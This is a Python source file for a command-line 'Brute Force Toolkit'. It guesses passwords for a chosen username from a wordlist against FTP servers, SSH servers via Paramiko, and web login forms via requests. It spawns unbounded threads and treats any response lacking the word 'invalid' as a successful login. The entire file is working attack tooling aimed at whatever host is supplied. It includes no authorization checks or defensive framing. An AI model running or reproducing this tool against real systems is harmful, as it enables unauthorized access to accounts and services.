# Project: Multi-service brute force automation with CLI

# This script structure will be divided into 4 detailed modules:
# 1. FTP Brute Forcer with multi-threading
# 2. SSH Brute Forcer using Paramiko
# 3. Web Login Brute Forcer using requests
# 4. CLI App Wrapper

# ==========================================================
# 1. FTP BRUTE FORCER with Multi threading
# ==========================================================

import ftplib
import threading
import argparse

ftp_success = False

def ftp_brute_thread(host, username, password):
    global ftp_success
    if ftp_success:
        return
    try:
        ftp = ftplib.FTP(host)
        ftp.login(username, password)
        print(f"[+] FTP Success: {username}:{password}")
        ftp_success = True
    except:
        print(f"[-] FTP Failed: {username}:{password}")


def ftp_brute_force(host, username, wordlist):
    with open(wordlist, 'r') as f:
        for line in f:
            password = line.strip()
            if ftp_success:
                break
            t = threading.Thread(target=ftp_brute_thread, args=(host, username, password))
            t.start()

# ==========================================================
# 2. SSH BRUTE FORCER using Paramiko
# ==========================================================

import paramiko
ssh_success = False

def ssh_brute_thread(host, username, password):
    global ssh_success
    if ssh_success:
        return
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host, username=username, password=password, timeout=3)
        print(f"[+] SSH Success: {username}:{password}")
        ssh_success = True
        ssh.close()
    except:
        print(f"[-] SSH Failed: {username}:{password}")


def ssh_brute_force(host, username, wordlist):
    with open(wordlist, 'r') as f:
        for line in f:
            password = line.strip()
            if ssh_success:
                break
            t = threading.Thread(target=ssh_brute_thread, args=(host, username, password))
            t.start()

# ==========================================================
# 3. WEB LOGIN BRUTE FORCER using requests
# ==========================================================

import requests

def web_brute_force(url, username_field, password_field, username, wordlist):
    with open(wordlist, 'r') as f:
        for line in f:
            password = line.strip()
            data = {
                username_field: username,
                password_field: password
            }
            try:
                res = requests.post(url, data=data)
                if "invalid" not in res.text.lower():
                    print(f"[+] Web Success: {username}:{password}")
                    break
                else:
                    print(f"[-] Web Failed: {username}:{password}")
            except Exception as e:
                print(f"[!] Web Error: {e}")

# ==========================================================
# 4. CLI WRAPPER for Brute Force Toolkit
# ==========================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute Force Toolkit")
    parser.add_argument("service", choices=["ftp", "ssh", "web"], help="Service to brute-force")
    parser.add_argument("host", help="Target IP or URL")
    parser.add_argument("username", help="Username to attack")
    parser.add_argument("wordlist", help="Path to password wordlist")
    parser.add_argument("--user-field", help="Web form username field name")
    parser.add_argument("--pass-field", help="Web form password field name")

    args = parser.parse_args()

    if args.service == "ftp":
        ftp_brute_force(args.host, args.username, args.wordlist)
    elif args.service == "ssh":
        ssh_brute_force(args.host, args.username, args.wordlist)
    elif args.service == "web":
        if not args.user_field or not args.pass_field:
            print("[!] Web brute force requires --user-field and --pass-field")
        else:
            web_brute_force(args.host, args.user_field, args.pass_field, args.username, args.wordlist)
